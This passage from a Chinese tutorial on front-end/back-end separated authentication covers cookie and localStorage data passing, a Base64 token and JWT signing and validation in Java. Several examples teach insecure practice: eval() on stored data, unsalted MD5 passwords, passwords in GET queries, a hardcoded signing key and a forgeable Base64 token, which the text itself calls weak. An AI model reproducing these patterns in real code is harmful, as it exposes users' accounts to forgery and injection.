keyword">var</span> name <span class="token operator">=</span> <span class="token function">getCookieValue</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token function">getCookieValue</span><span class="token punctuation">(</span><span class="token string">"userimg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h6 id="6-4-2-localStorage"><a href="#6-4-2-localStorage" class="headerlink" title="6.4.2 localStorage"></a>6.4.2 localStorage</h6><ul><li><p>A页面</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>B页面</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> jsonStr <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> userInfo <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"("</span><span class="token operator">+</span>jsonStr<span class="token operator">+</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//移出localStorage键值对</span>localStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="七、前后端分离用户认证-JWT"><a href="#七、前后端分离用户认证-JWT" class="headerlink" title="七、前后端分离用户认证-JWT"></a>七、前后端分离用户认证-JWT</h2><h4 id="7-1-基于session实现单体项目用户认证"><a href="#7-1-基于session实现单体项目用户认证" class="headerlink" title="7.1 基于session实现单体项目用户认证"></a>7.1 基于session实现单体项目用户认证</h4><blockquote><p>在单体项目中如何保证受限资源在用户未登录的情况下不允许访问？</p></blockquote><p><img src="imgs/1619158116136.png" alt="1619158116136"></p><blockquote><p>在单体项目中，视图资源（页面）和接口（控制器）都在同一台服务器，用户的多次请求都是基于同一个会话（session），因此可以借助session来进行用户认证判断：</p><p>1.当用户登录成功之后，将用户信息存放到session</p><p>2.当用户再次访问受限资源时，验证session中是否存在用户信息，可以根据session有无用户信息来判断用户是否登录</p></blockquote><h4 id="7-2-基于token实现前后端分离用户认证"><a href="#7-2-基于token实现前后端分离用户认证" class="headerlink" title="7.2 基于token实现前后端分离用户认证"></a>7.2 基于token实现前后端分离用户认证</h4><blockquote><p>由于在前后端分离项目开发中，前后端之间是通过异步交互完成数据访问的，请求是无状态的，因此不能基于session实现用户的认证。</p></blockquote><p><img src="imgs/1619149656171.png" alt="1619149656171"></p><h4 id="7-3-基于token的用户认证的实现"><a href="#7-3-基于token的用户认证的实现" class="headerlink" title="7.3 基于token的用户认证的实现"></a>7.3 基于token的用户认证的实现</h4><h6 id="7-3-1-登录认证接口生成token"><a href="#7-3-1-登录认证接口生成token" class="headerlink" title="7.3.1 登录认证接口生成token"></a>7.3.1 登录认证接口生成token</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// UserController</span><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span>                      <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"password"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> pwd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">checkLogin</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// UserServiceImpl</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">checkLogin</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> pwd<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">Example</span> example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">Users</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Users</span><span class="token punctuation">&gt;</span></span> users <span class="token operator">=</span> usersMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"登录失败，用户名不存在！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token class-name">String</span> md5Pwd <span class="token operator">=</span> <span class="token class-name">MD5Utils</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>md5Pwd<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//如果登录验证成功，则需要生成令牌token（token就是按照特定规则生成的字符串）</span>            <span class="token class-name">String</span> token <span class="token operator">=</span> <span class="token class-name">Base64Utils</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"QIANfeng6666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span>token<span class="token punctuation">,</span>users<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"登录失败，密码错误！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-3-2-登录页面接收到token存储到cookie"><a href="#7-3-2-登录页面接收到token存储到cookie" class="headerlink" title="7.3.2 登录页面接收到token存储到cookie"></a>7.3.2 登录页面接收到token存储到cookie</h6><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.html</span><span class="token function-variable function">doSubmit</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span>isRight<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> url <span class="token operator">=</span> baseUrl<span class="token operator">+</span><span class="token string">"user/login"</span><span class="token punctuation">;</span>        axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token punctuation">{</span>            params<span class="token operator">:</span><span class="token punctuation">{</span>                username<span class="token operator">:</span>vm<span class="token punctuation">.</span>username<span class="token punctuation">,</span>                password<span class="token operator">:</span>vm<span class="token punctuation">.</span>password            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> vo <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment">//如果登录成功，就把token存储到cookie</span>                <span class="token function">setCookieValue</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span>vo<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>                window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"index.html"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                vm<span class="token punctuation">.</span>tips <span class="token operator">=</span> <span class="token string">"登录失败，账号或密码错误！"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        vm<span class="token punctuation">.</span>tips <span class="token operator">=</span> <span class="token string">"请正确输入帐号和密码！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-3-3-购物车页面加载时访问购物车列表接口"><a href="#7-3-3-购物车页面加载时访问购物车列表接口" class="headerlink" title="7.3.3 购物车页面加载时访问购物车列表接口"></a>7.3.3 购物车页面加载时访问购物车列表接口</h6><ul><li>获取token</li><li>携带token访问接口</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> baseUrl <span class="token operator">=</span> <span class="token string">"http://localhost:8080/"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span>            token<span class="token operator">:</span><span class="token string">""</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token function-variable function">created</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//当进入到购物车页面时，就要查询购物车列表（访问购物车列表接口）</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>token <span class="token operator">=</span> <span class="token function">getCookieValue</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"token:"</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">axios</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                method<span class="token operator">:</span><span class="token string">"get"</span><span class="token punctuation">,</span>                url<span class="token operator">:</span>baseUrl<span class="token operator">+</span><span class="token string">"shopcart/list"</span><span class="token punctuation">,</span>                params<span class="token operator">:</span><span class="token punctuation">{</span>                    token<span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>token                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-3-4-在购物车列表接口校验token"><a href="#7-3-4-在购物车列表接口校验token" class="headerlink" title="7.3.4 在购物车列表接口校验token"></a>7.3.4 在购物车列表接口校验token</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/list"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"string"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"token"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"授权令牌"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listCarts</span><span class="token punctuation">(</span><span class="token class-name">String</span> token<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//1.获取token</span>    <span class="token comment">//2.校验token</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"请先登录"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token class-name">String</span> decode <span class="token operator">=</span> <span class="token class-name">Base64Utils</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>decode<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"QIANfeng6666"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//token校验成功</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span><span class="token string">"success"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"登录过期，请重新登录！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="7-4-JWT"><a href="#7-4-JWT" class="headerlink" title="7.4 JWT"></a>7.4 JWT</h4><blockquote><p>如果按照上述规则生成token：</p><p>1.简易的token生成规则安全性较差，如果要生成安全性很高的token对加密算法要求较高；</p><p>2.无法完成时效性的校验（登录过期）</p></blockquote><h6 id="7-4-1-JWT简介"><a href="#7-4-1-JWT简介" class="headerlink" title="7.4.1 JWT简介"></a>7.4.1 JWT简介</h6><ul><li><p>JWT： Json Web Token</p></li><li><p>官网：<a href="https://jwt.io/">https://jwt.io</a></p></li><li><p>jwt的结构</p><p><img src="imgs/1619161525439.png" alt="1619161525439"></p></li></ul><h6 id="7-4-2-生成JWT"><a href="#7-4-2-生成JWT" class="headerlink" title="7.4.2 生成JWT"></a>7.4.2 生成JWT</h6><ul><li><p>添加依赖</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.auth0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>java-jwt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.10.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>io.jsonwebtoken<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jjwt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.9.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>生成token</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> token <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">setSubject</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>                 <span class="token comment">//主题，就是token中携带的数据</span>    <span class="token punctuation">.</span><span class="token function">setIssuedAt</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token comment">//设置token的生成时间</span>    <span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span>               <span class="token comment">//设置用户id为token  id</span>    <span class="token punctuation">.</span><span class="token function">setClaims</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span>                                     <span class="token comment">//map中可以存放用户的角色权限信息</span>    <span class="token punctuation">.</span><span class="token function">setExpiration</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//设置过期时间</span>    <span class="token punctuation">.</span><span class="token function">signWith</span><span class="token punctuation">(</span><span class="token class-name">SignatureAlgorithm</span><span class="token punctuation">.</span>HS256<span class="token punctuation">,</span> <span class="token string">"QIANfeng6666"</span><span class="token punctuation">)</span>     <span class="token comment">//设置加密方式和加密密码</span>    <span class="token punctuation">.</span><span class="token function">compact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="7-4-3-JWT校验"><a href="#7-4-3-JWT校验" class="headerlink" title="7.4.3 JWT校验"></a>7.4.3 JWT校验</h6><ul><li><p>如果token正确则正常解析，如果token不正确或者过期，则通过抛出的异常进行识别</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment">//验证token</span>    <span class="token class-name">JwtParser</span> parser <span class="token operator">=</span> <span class="token class-name">Jwts</span><span class="token punctuation">.</span><span class="token function">parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    parser<span class="token punctuation">.</span><span class="token function">setSigningKey</span><span class="token punctuation">(</span><span class="token string">"QIANfeng6666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//解析token的SigningKey必须和生成token时设置密码一致</span>    <span class="token comment">//如果token正确（密码正确，有效期内）则正常执行，否则抛出异常</span>    <span class="token class-name">Jws</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Claims</span><span class="token punctuation">&gt;</span></span> claimsJws <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseClaimsJws</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Claims</span> body <span class="token operator">=</span> claimsJws<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取token中用户数据</span>    <span class="token class-name">String</span> subject <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">getSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取生成token设置的subject</span>    <span class="token class-name">String</span> v1 <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取生成token时存储的Claims的map中的值</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span><span class="token string">"success"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ExpiredJwtException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"登录过期，请重新登录！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnsupportedJwtException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"Tonken不合法，请自重！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"请重新登录！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="7-4-4-拦截器校验Token"><a href="#7-4-4-拦截器校验Token" class="headerlink" title="7.4.4 拦截器校验Token"></a>7.4.4 拦截器校验Token</h6><ul><li><p>创建拦截器</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CheckTokenInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> token <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span> <span class="token string">"请先登录！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//提示请先登录</span>            <span class="token function">doResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token comment">//验证token</span>                <span class="token class-name">JwtParser</span> parser <span class="token operator">=</span> <span class="token class-name">Jwts</span><span class="token punctuation">.</span><span class="token function">parser</span><span class="token 